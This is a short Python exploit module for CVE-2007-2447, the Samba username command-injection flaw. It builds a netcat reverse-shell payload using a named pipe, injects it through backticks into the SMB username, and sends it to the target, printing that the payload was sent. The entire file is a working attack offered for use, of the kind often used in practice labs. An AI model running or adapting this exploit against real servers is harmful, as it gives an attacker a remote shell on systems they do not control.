from smb.SMBConnection import SMBConnection


class CVE:
    """
        CVE-2007-2447. Allows remote attackers to execute arbitrary commands
        by specifying a username containing shell meta characters.
    """

    def __init__(self, host, port, lhost, lport):
        self.host = host
        self.port = port
        self.payload = f"mkfifo /tmp/hago; nc {lhost} {lport} 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago"
        self.username = f"/=`nohup {self.payload}`"

    def exploit(self):
        conn = SMBConnection(self.username, "", "", "")

        try:
            conn.connect(self.host, self.port, timeout=1)
        except ConnectionError:
            print("[+] Payload was sent")
